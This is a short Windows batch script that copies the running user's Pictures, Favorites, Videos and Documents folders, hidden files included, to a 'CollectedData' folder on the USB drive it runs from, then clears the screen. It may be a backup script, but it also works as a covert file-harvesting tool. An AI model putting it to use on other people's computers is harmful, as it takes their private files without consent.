@echo off

:: Get USB drive letter dynamically (where script is running from)
set usbDrive=%~d0

:: Set folder on USB dynamically
set dest=%usbDrive%\CollectedData

:: Create destination folder if it doesn't exist
if not exist "%dest%" mkdir "%dest%"

:: Setup xcopy options
set backupcmd=xcopy /s /c /d /e /h /i /r /y

:: Copy user folders to dynamically-detected USB
%backupcmd% "%USERPROFILE%\Pictures"   "%dest%\My pics"
%backupcmd% "%USERPROFILE%\Favorites"  "%dest%\Favorites"
%backupcmd% "%USERPROFILE%\Videos"     "%dest%\Videos"
%backupcmd% "%USERPROFILE%\Documents"  "%dest%\Documents"

cls
